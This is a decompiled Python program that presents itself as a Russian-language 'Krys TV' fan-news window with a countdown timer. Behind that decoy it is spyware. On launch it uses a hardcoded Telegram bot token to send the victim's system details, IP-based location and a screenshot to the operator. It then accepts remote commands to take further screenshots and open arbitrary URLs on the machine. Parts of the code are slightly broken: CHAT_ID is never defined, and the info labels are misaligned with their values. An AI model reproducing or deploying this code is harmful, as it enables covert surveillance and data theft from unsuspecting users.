# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: Downloads\sus.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import time
import telebot
import psutil
import platform
import socket
import os
import webbrowser
import pyautogui
from PIL import Image, ImageTk
import requests
TOKEN = '6772619419:AAEojA3fUvZOJR5vYZasGbEP9PIdV_KXkWg'
bot = telebot.TeleBot(TOKEN)
last_screenshot = None
BG_COLOR = '#1e1e1e'
TEXT_COLOR = '#f0f0f0'
ACCENT_COLOR = '#ff5555'
FONT_MAIN = ('Arial', 11)
FONT_TITLE = ('Arial', 16, 'bold')

def get_system_info():
    """Получение расширенной информации о системе"""
    try:
        ip_info = requests.get('https://ipinfo.io/json').json()
        location = f"{ip_info.get('city', '?')}, {ip_info.get('country', '?')}"
        org = ip_info.get('org', 'Неизвестно')
    except:
        location = 'Не удалось определить'
        org = 'Неизвестно'
    info = {'🐀 Система': f'{platform.system()} {platform.release()}', '💻 Процессор': platform.processor(), '🧠 Память': f'{round(psutil.virtual_memory().total / 1073741824.0, 2)} GB', '📁 Диск': os.getlogin(), '👤 Пользователь': socket.gethostbyname(socket.gethostname()), '🌐 Локальный IP': location, '📍 Местоположение': org, '🏢 Провайдер': 'Свинья опущена [OK]', '🔐 Спецстатус': time.strftime('%Y-%m-%d %H:%M:%S')}
    return '\n'.join([f'{k}: {v}' for k, v in info.items()])

def send_initial_data():
    """Отправка всех данных при запуске"""
    try:
        bot.send_message(CHAT_ID, f'🚀 Крыс-система активирована!\n{get_system_info()}')
        screenshot_path = 'startup_screen.png'
        pyautogui.screenshot(screenshot_path)
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(CHAT_ID, photo)
        bot.send_message(CHAT_ID, f"💾 Диск: {psutil.disk_usage('/').percent}% заполнено\n🔥 CPU: {psutil.cpu_percent()}% нагрузки\n🧠 RAM: {psutil.virtual_memory().percent}% использования")
    except Exception as e:
        print(f'Ошибка отправки данных: {e}')

@bot.message_handler(commands=['lol'])
def send_last_screenshot(message):
    try:
        screenshot_path = 'startup_screen.png'
        pyautogui.screenshot(screenshot_path)
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(CHAT_ID, photo)
    except Exception as e:
        bot.reply_to(message, f'⚠ Ошибка: {str(e)}')

@bot.message_handler(commands=['url'])
def open_url_command(message):
    try:
        url = message.text.split()[1]
        webbrowser.open(url)
        bot.reply_to(message, f'🌐 Открыто: {url}')
    except IndexError:
        bot.reply_to(message, '❌ Укажите URL после /url')
    except Exception as e:
        bot.reply_to(message, f'⚠ Ошибка: {str(e)}')

class KrysApp(tk.Tk):

    def __init__(self):
        super().__init__()
        self.title('Крыс ТВ')
        self.geometry('800x600')
        self.configure(bg=BG_COLOR)
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('.', background=BG_COLOR, foreground=TEXT_COLOR)
        self.style.configure('TLabel', font=FONT_MAIN)
        self.style.configure('Title.TLabel', font=FONT_TITLE, foreground=ACCENT_COLOR)
        self.create_widgets()
        threading.Thread(target=self.start_bot, daemon=True).start()
        threading.Thread(target=send_initial_data, daemon=True).start()

    def create_widgets(self):
        """Создание элементов интерфейса"""
        header = ttk.Frame(self)
        header.pack(pady=20, fill=tk.X)
        ttk.Label(header, text='🐀 КРЫС ТВ - ОФИЦИАЛЬНЫЙ КАНАЛ', style='Title.TLabel').pack()
        timer_frame = ttk.Frame(self)
        timer_frame.pack(pady=10)
        ttk.Label(timer_frame, text='До премьеры нового трека:').pack(side=tk.LEFT)
        self.timer_label = ttk.Label(timer_frame, text='∞', font=('Arial', 14, 'bold'), foreground=ACCENT_COLOR)
        self.timer_label.pack(side=tk.LEFT, padx=5)
        news_frame = ttk.LabelFrame(self, text='ЭКСКЛЮЗИВНЫЕ НОВОСТИ', padding=15)
        news_frame.pack(pady=10, padx=20, fill=tk.BOTH, expand=True)
        self.news_text = scrolledtext.ScrolledText(news_frame, wrap=tk.WORD, font=FONT_MAIN, bg='#252525', fg=TEXT_COLOR, padx=10, pady=10)
        self.news_text.pack(fill=tk.BOTH, expand=True)
        self.update_news()
        threading.Thread(target=self.update_timer, daemon=True).start()

    def update_news(self):
        """Обновление новостной ленты"""
        news_content = '\n🔥 [СРОЧНЫЕ НОВОСТИ] 🔥\n\nКрыс Крысович завершил работу над революционным треком, \nкоторый перевернет всю музыкальную индустрию! \n\n📌 Основные детали:\n- Длительность: 9 минут 66 секунд\n- Жанр: Крыс-кор (новый жанр)\n- Особенности: 10-слойный рев, записанный в канализационных трубах Москвы\n\n💣 [СКАНДАЛ] \nНаш инсайдер в студии SoundCloud подтвердил, \nчто алгоритмы рекомендаций были изменены после \nзнаменитого "инцидента со свиньей". \n\nxDevster пытался протестовать, но его аккаунт \nтаинственным образом получил 1000 фейковых жалоб.\n\n🎵 [ТЕХНИЧЕСКИЕ ДЕТАЛИ]\nТрек будет распространяться через:\n- Секретные магнитные ссылки\n- Закодированные радиосигналы\n- Подземные точки обмена в 15 городах СНГ\n\n🕒 [ТАЙМЕР ДО РЕЛИЗА]\nОфициальная дата не объявлена, но система \nотсчета показывает, что осталось ждать: ∞\n'
        self.news_text.insert(tk.END, news_content)
        self.news_text.config(state=tk.DISABLED)

    def update_timer(self):
        """Обновление бесконечного таймера"""
        while True:
            self.timer_label.config(text='∞')
            time.sleep(1)

    def start_bot(self):
        """Запуск Telegram бота"""
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f'Ошибка бота: {e}')
if __name__ == '__main__':
    app = KrysApp()
    app.mainloop()